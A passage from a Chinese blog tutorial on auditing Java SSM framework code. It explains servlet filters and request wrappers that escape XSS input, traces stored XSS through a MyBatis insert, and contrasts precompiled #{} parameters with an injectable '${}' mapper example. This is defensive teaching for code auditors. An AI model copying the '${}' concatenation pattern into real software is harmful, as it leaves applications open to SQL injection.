js<br>和ico资源发起的请求就不回在将改请求转发至XssFilter类。</p><p>我们在审计代码时<br>这里也是需要注意的一个点，因为有可能开发人员的错误配置导致本应该经过过滤器的请求，错误的给直接放行了，这样即使项目中有过滤器，也是不会生效的。</p><p>明白了&lt;filter&gt;标签的作用我们就去看XssFilter这个类的内容</p><p><img src="/2020/05/31/java-kuang-jia-ji-ssm-dai-ma-shen-ji-si-lu/35.png" alt=""></p><p>可以看到filter包下有两个java类，我们先看XssFilter这个类</p><p><img src="/2020/05/31/java-kuang-jia-ji-ssm-dai-ma-shen-ji-si-lu/36.png" alt=""></p><p>可以看到我们的XssFilter这个类实现了一个叫Filter的接口</p><p>我们去看一下Filter接口的源码</p><p><img src="/2020/05/31/java-kuang-jia-ji-ssm-dai-ma-shen-ji-si-lu/37.png" alt=""></p><p>可以看到Filter所属的包是javax.servlet</p><p>Filter是Servlet的三大组件之一</p><p>javax.servlet.Filter 是一个接口，过滤请求，实现请求的拦截或者放行，并且添加新的功能</p><p>众所周知接口其实就是一个标准，所以我们想要编写自己的过滤器自然也要遵守这个标准即实现Filter这个接口。</p><p>Filter接口中有三个方法，这里简单介绍一下</p><p>init方法：</p><p>在创建完过滤器对象之后被调用。只执行一次</p><p>doFilter方法：</p><p>执行过滤任务方法。执行多次。</p><p>destroy方法：</p><p>Web服务器停止或者Web应用重新加载，销毁过滤器对象。</p><p>当 Servlet 容器开始调用某个 Servlet 程序时，如果发现已经注册了一个 Filter<br>程序来对该 Servlet 进行拦截，那么容器不再直接调用 Servlet 的 service<br>方法，而是调用 Filter 的 doFilter 方法，再由 doFilter 方法决定是否去激活 service<br>方法</p><p>不难看出需要我们重点关注的方法是doFilter方法</p><p><img src="/2020/05/31/java-kuang-jia-ji-ssm-dai-ma-shen-ji-si-lu/38.png" alt=""></p><p>这里的request的参数和response参数可以理解成封装了请求数据和相应数据的对象，我们需要过滤的数据就是存放在这两个对象中，</p><p>最后一个参数FilterChain，通过名字我们猜这个参数是一个过滤链，查看一下FilterChain的源码</p><p><img src="/2020/05/31/java-kuang-jia-ji-ssm-dai-ma-shen-ji-si-lu/39.png" alt=""></p><p>看到FilterChain是一个接口，而且这个接口只有一个方法，那就是doFilter方法，FilterChain参数存在的意义就在于，在一个<br>Web 应用程序中可以注册多个 Filter 程序，每个 Filter 程序都可以对一个或一组<br>Servlet 程序进行拦截。如果有多个 Filter 程序都可以对某个 Servlet<br>程序的访问过程进行拦截，当针对该 Servlet 的访问请求到达时，Web 容器将把这多个<br>Filter 程序组合成一个 Filter 链（也叫过滤器链），</p><p>Filter 链中的各个 Filter 的拦截顺序与它们在 web.xml 文件中的映射顺序一致，上一个<br>Filter.doFilter 方法中调用 FilterChain.doFilter 方法将激活下一个<br>Filter的doFilter 方法，最后一个 Filter.doFilter 方法中调用的<br>FilterChain.doFilter 方法将激活目标 Servlet的service 方法</p><p>只要 Filter 链中任意一个 Filter 没有调用 FilterChain.doFilter 方法，则目标<br>Servlet 的 service 方法都不会被执行</p><p>介绍完FilterChain接下来大家应该发现，虽然名字叫过滤器</p><p>但是调用chain.dofilter方法似乎并没有执行任何类似过滤的工作，没有看到任何类似黑名单或者白名单的过滤规则</p><p>在调用chain.dofilter方法时我们传递了两个参数进去</p><p>new XSSRequestWrapper((HttpServletRequest) request)和response</p><p>这就是说我们传递了一个XSSRequestWrapper对象和ServletRespons对象，我们关心的当然是这个XSSRequestWrapper</p><p>在传递参数的过程中我们通过调用XSSRequestWrapper的构造器，传递了HttpServletRequest对象，这里简单从继承关系让大家看一下HttpServletRequest和ServletRequest的关系</p><p><img src="/2020/05/31/java-kuang-jia-ji-ssm-dai-ma-shen-ji-si-lu/40.png" alt=""></p><p>既然这里生成了一个XSSRequestWrapper对象并传入的参数那我们自然要跟进一探究竟</p><p><img src="/2020/05/31/java-kuang-jia-ji-ssm-dai-ma-shen-ji-si-lu/41.png" alt=""></p><p>正好filter下面有一个叫XSSRequestWrapper的类，我们看一下代码</p><p><img src="/2020/05/31/java-kuang-jia-ji-ssm-dai-ma-shen-ji-si-lu/42.png" alt=""></p><p>看到这里大家应该恍然大悟，原来过滤的行为是在这里进行了，而XssFilter的存在只是在链式执行过滤器并最终将值传给Servlet时调用XSSRequestWrapper来进行过滤并获取过滤结果而已。</p><p>这里对过滤规则就不过多赘述，网上有很多好的过滤规则，这里就不多提了。</p><p>这里肯定有很多人并明白问什么不将过滤的逻辑代码写在XssFilter中而是又新写了一个类，不是多此一举么？</p><p>这么做当然不是多此一举，首先解耦这个理由就已经足够充分了，其次我们看到XSSRequestWrapper继承了一个类<br>HttpServletRequestWrapper</p><p>这里我们看一下HttpServletRequestWrapper类的继承关系</p><p><img src="/2020/05/31/java-kuang-jia-ji-ssm-dai-ma-shen-ji-si-lu/43.png" alt=""></p><p>我们可以看到HttpServletRequestWrapper是实现了HttpServletRequest接口的，我们这里提一下过滤这个概念，我们的想法是尽可能的把请求中的有危害的数据或者特殊符号过滤掉，然后将过滤后的数据转发向后面的业务代码并继续执行，而不是说发现请求数据中有特殊字符就直接停止执行，抛出异常，返回给用户一个400页面，所以既然要继续执行，那我们就要去修改或者转义HttpServletRequest对象中的恶意数据或者特殊字符。然而HttpServletRequest对象中的数据是不允许被修改的，也就是说HttpServletRequest对象没有提供给我们直接修改请求数据的方法。</p><p>此时矛盾就来了，我们想要修改但是HttpServletRequest对象又不给提供，所以HttpServletRequestWrapper这个类就出现了，这里用到了常见的23中设计模式之一的装饰者模式，限于篇幅原因不可能对装饰者模式在进行讲解了，感兴趣的同学可以自己去研究。也就是说HttpServletRequestWrapper这个类的出现就是为了给我们提供修改request请求数据的方法的，到这里大家应该就明白了为什么需要单写一个类来进行过滤的行为，不是我们想着么写，而是框架就这么设计的，为的就是解耦。</p><p>此时当HttpServletRequestWrapper将请求中的数据过滤完，并修改完成后返回然后作为chain.doFilter方法的形参进行传递。</p><p>结合之前说的，最后一个 Filter.doFilter 方法中调用的 FilterChain.doFilter<br>方法将激活目标 Servlet的service 方法</p><p>由于我们没有配置第二个Filter所以XssFilter中的chain.doFilter将会激活我们Servlet的service方法即DispatcherServlet的service方法，然后数据将传入我们的SpringMVC的Controller层交由我们的BookController来处理。</p><p>我们这次使用filter来演示一下效果</p><p><img src="/2020/05/31/java-kuang-jia-ji-ssm-dai-ma-shen-ji-si-lu/44.png" alt=""></p><p>老地方下断</p><p><img src="/2020/05/31/java-kuang-jia-ji-ssm-dai-ma-shen-ji-si-lu/45.png" alt=""></p><p>然后再次执行到这里时XSS语句中的特殊字符已经被Filter转义。</p><p><img src="/2020/05/31/java-kuang-jia-ji-ssm-dai-ma-shen-ji-si-lu/46.png" alt=""></p><p>自然也就不会存在Xss的问题了。</p><h1 id="SSM框架审计思路总结"><a href="#SSM框架审计思路总结" class="headerlink" title="SSM框架审计思路总结"></a>SSM框架审计思路总结</h1><h2 id="思路总结"><a href="#思路总结" class="headerlink" title="思路总结"></a>思路总结</h2><p>最后总结一下SSM框架的审计思路，审计思路其实就是我们代码的执行思路</p><p>和审计非SSM框架代码的主要区别就是在于SSM框架的各种XML配置，和注解配置，需要我们根据XML中的配置和注解来查看代码的执行路径，SSM框架中常见的注解和注解中的属性，以及常见的标签和标签的各个属性。</p><p>审计漏洞的方式同正常的java代码审计没有区别，网上有很多非常优秀的java代码审计文章，关于每个漏洞的审计方式写的都非常全面，我们需要的就只是将其移植到SSM框架的审计中来，我们明白SSM的执行流程了，自然就明白了该怎么在SSM框架中跟踪参数，例如刚刚讲的XSS漏洞，我们根据XML中的配置和注解中的配置一路跟到了Mybatis的mapper.xml这个映射文件，找到了最中执行的</p><p>insert into ssmbuild.books(bookName,bookCounts,detail)</p><p>values (#{bookName}, #{bookCounts}, #{detail})</p><p>这个sql语句，发现我们传入的books参数直到sql语句执行的前一刻都没有经过任何的过滤处理，所以此处插入数据库的参数自然是不可信的脏数据。</p><p>当我们再次查询这条数据并返回到前端时就非常可能造成存储型XSS攻击</p><p>我们在审计这类漏洞时，最简单的方法就是先去web.xml中去查看有没有配置相关的过滤器，如果有哪我们就去看看过滤器的规则是否严格，如果没有那就很有可能存在漏洞。</p><h2 id="补充知识"><a href="#补充知识" class="headerlink" title="补充知识"></a>补充知识</h2><p>最后还要提一个必要重要的Mybaits知识点就是Mybatis的预编译，关于java的预编译简单介绍一下</p><p>非预编译的情况下我们每次执行sql都需要将slq和参数拼接在一起然后传给数据库编译执行，这样采用拼接的方式非常容易产生SQL注入漏洞，当然可以使用filter对参数进行过滤来避免产生SQL注入，</p><p>而在预编译的情况下，程序会提前将我们的sql语句编译好，程序执行的时候只需要将传递进来的参数交由数据库进行操作就可以了，此时不论传来的参数是什么，都不会被当成时SQL语句的一部分，因为真正的SQL语句已经提前编译好了，所以即使不过滤也不会产生SQL注入这类漏洞，</p><p>以下面这个mapper.xml中的SQL语句举例</p><p>insert into ssmbuild.books(bookName,bookCounts,detail)</p><p>values (#{bookName}, #{bookCounts}, #{detail})</p><p>#{bookName}这种形式的就是采用了预编译的形式传参，而以下这种形式</p><p>insert into ssmbuild.books(bookName,bookCounts,detail)</p><p>values (‘${bookName}’,’${bookCounts}’, ‘${detail}’)</p><p>‘${bookName}’这种写法就是没有使用预编译的形式进行传参数，此时如果不对传入的参数进行过滤和校验的话就会产生SQL注入漏洞</p><p>‘${xxxx}’和#{xxxx}其实就是jdbc的Statement和PreparedStatement对象。</p><h2 id="学习建议"><a href="#学习建议" class="headerlink" title="学习建议"></a>学习建议</h2><p>整篇文章对SSM框架的整个执行流程和审计流程进行了简单的讲解，后续想要增强SSM框架的审计水平，推荐大家自己上手一些简单SSM框架搭建的项目，实战永远是最快的学习方式，大家在审计SSM框架可能遇到的最大的困难就是有很多新的之前没有碰到过的注解，和XML中一些SSM独有的标签，这些注解和标签数量很多，没有办法在一篇文章中讲完，大家碰到不懂的注解和标签都可以通过官方提供的文档和搜索引擎来寻找答案。</p><p>最后感谢大家的耐心观看。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
            <tag> 代码审计 </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
